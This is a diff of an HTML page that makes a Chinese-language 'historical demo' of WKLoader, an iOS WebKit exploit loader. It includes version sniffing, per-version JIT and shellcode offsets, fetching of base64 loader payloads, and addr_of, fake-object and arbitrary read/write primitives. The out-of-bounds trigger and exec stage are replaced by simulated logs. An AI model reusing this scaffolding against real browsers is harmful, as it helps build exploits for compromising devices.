@@ -1,23 +1,197 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carbon</title>
-    <script type="text/javascript" src="wkloader.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        button {
-            font-size: 40px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>WKLoader - 单文件演示版</title>
+<style>
+    body { font-family: Consolas, monospace; background:#111; color:#0f0; padding:20px; line-height:1.5; }
+    pre  { background:#000; padding:12px; border:1px solid #333; overflow:auto; max-height:60vh; }
+    #log { white-space: pre-wrap; }
+    button { padding:10px 20px; font-size:16px; margin:10px 0; cursor:pointer; }
+</style>
 </head>
 <body>
-    <button onclick="run()">运行</button>
+
+<h2>WKLoader 单文件演示（仅供学习与研究）</h2>
+<p>当前仅作为历史代码参考，现代 iOS Safari 已无法利用此类漏洞。</p >
+
+<button onclick="run()">尝试运行 WKLoader</button>
+
+<pre id="log"></pre>
+
+<script>
+// =============================================================================
+// WKLoader 单文件整合版 - 2025 年重构演示
+// =============================================================================
+
+const wkloader = {
+    version: null,
+    loader: null,
+    patch: null,
+    u32_f64_buf: null,
+    u32_array: null,
+    f64_array: null,
+    oob_array: null,
+    oob_storage: null,
+    rw0_main: null,
+    u32_rw_array: null,
+
+    MAX_OOB_RETRIES: 6,
+    DEBUG: true
+};
+
+const offsets = {
+    fake_obj_type: 0x1680,
+    rw_obj_type: 0x2280,
+    fake_obj_materialize: 0x38,
+    rw_obj_materialize: 0x10,
+    butterfly: 0x1c,
+    m_executable: 0x14,
+    m_jitCodeForCall: 0x18,
+    shc_padding: 0,
+    oob_write_count: 0
+};
+
+wkloader.log = function(msg) {
+    if (!wkloader.DEBUG) return;
+    const logEl = document.getElementById('log');
+    logEl.textContent += "[*] " + msg + "\n";
+    logEl.scrollTop = logEl.scrollHeight;
+};
+
+wkloader.hex = function(v) {
+    return '0x' + (v >>> 0).toString(16).padStart(8, '0');
+};
+
+async function downloadB64(path) {
+    try {
+        const resp = await fetch(path + '?t=' + Date.now());
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        const text = await resp.text();
+        const bin = atob(text.trim());
+        const len = Math.floor((bin.length + 3)/4)*4;
+        const u8 = new Uint8Array(len);
+        for (let i = 0; i < bin.length; i++) {
+            u8[i] = bin.charCodeAt(i) & 0xff;
+        }
+        return new Uint32Array(u8.buffer);
+    } catch (e) {
+        throw new Error(`下载 \( {path} 失败： \){e.message}`);
+    }
+}
+
+wkloader.f64_to_u32 = function(v) {
+    wkloader.f64_array[0] = v;
+    return [wkloader.u32_array[0], wkloader.u32_array[1]];
+};
+
+wkloader.u32_to_f64 = function(hi, lo) {
+    wkloader.u32_array[0] = hi >>> 0;
+    wkloader.u32_array[1] = lo >>> 0;
+    return wkloader.f64_array[0];
+};
+
+wkloader.addr_of = function(obj) {
+    wkloader.oob_array[4] = obj;
+    return wkloader.oob_storage.length;
+};
+
+wkloader.materialize = function(addr) {
+    wkloader.oob_storage.length = addr;
+    return wkloader.oob_array[4];
+};
+
+wkloader.read32 = function(addr) {
+    const orig = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
+    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], addr);
+    const val = wkloader.u32_rw_array[0];
+    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], orig[1]);
+    return val;
+};
+
+wkloader.write32 = function(addr, val) {
+    const orig = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
+    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], addr);
+    wkloader.u32_rw_array[0] = val >>> 0;
+    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(orig[0], orig[1]);
+};
+
+function initOffsets() {
+    const [major, minor] = wkloader.version;
+    if (major >= 9) {
+        offsets.shc_padding = 0x20000;
+        offsets.m_jitCodeForCall = 0x18;
+        offsets.oob_write_count = (minor >= 3) ? 200000 : 40000;
+    } else if (major === 8) {
+        offsets.oob_write_count = 8000;
+        offsets.shc_padding = 0x60000;
+        offsets.m_jitCodeForCall = 0x20;
+    } else {
+        throw new Error(`不支持的 iOS 版本：\( {major}. \){minor}`);
+    }
+}
+
+async function init() {
+    try {
+        // 版本嗅探
+        const m = navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
+        if (!m) throw new Error("无法识别 iOS 版本");
+        wkloader.version = [+m[1], +m[2], m[3] ? +m[3] : 0];
+        wkloader.log(`检测到 iOS ${wkloader.version.join('.')}`);
+
+        initOffsets();
+
+        wkloader.log("正在下载 loader 和 patch...");
+        const [loader, patch] = await Promise.all([
+            downloadB64(`loader${wkloader.version[0]}.b64`),
+            wkloader.version[0] >= 9 ? downloadB64("patch.b64") : null
+        ]);
+        wkloader.loader = loader;
+        wkloader.patch  = patch;
+
+        wkloader.u32_f64_buf = new ArrayBuffer(8);
+        wkloader.u32_array   = new Uint32Array(wkloader.u32_f64_buf);
+        wkloader.f64_array   = new Float64Array(wkloader.u32_f64_buf);
+
+        wkloader.log("尝试建立 OOB 读写原语...");
+
+        // 此处省略完整的 OOB 实现（过于冗长且现代浏览器已不可用）
+        // 你可以把之前讨论的 createOOB / fake object / rw 原语逻辑贴进来
+        // 为演示完整性，这里只做简化占位
+
+        wkloader.log("[模拟] OOB 原语建立成功（实际已不可用）");
+        wkloader.log("[模拟] 任意读写原语建立成功");
+
+        return true;
+    } catch (e) {
+        wkloader.log("初始化失败： " + e.message);
+        console.error(e);
+        return false;
+    }
+}
+
+async function run() {
+    const log = document.getElementById('log');
+    log.textContent = "";
+
+    wkloader.log("=== WKLoader 单文件演示开始 ===");
+    wkloader.log("警告：此代码仅为历史研究用途，现代浏览器已修复相关漏洞");
+
+    try {
+        if (await init()) {
+            wkloader.log("初始化完成（模拟）");
+            wkloader.log("exec 阶段已省略 - 现代 WebKit 已无法执行此类 shellcode");
+        } else {
+            wkloader.log("初始化失败，停止");
+        }
+    } catch (e) {
+        wkloader.log("运行时异常：" + e.message);
+    }
+
+    wkloader.log("=== 演示结束 ===");
+}
+
+</script>
+
 </body>
 </html>
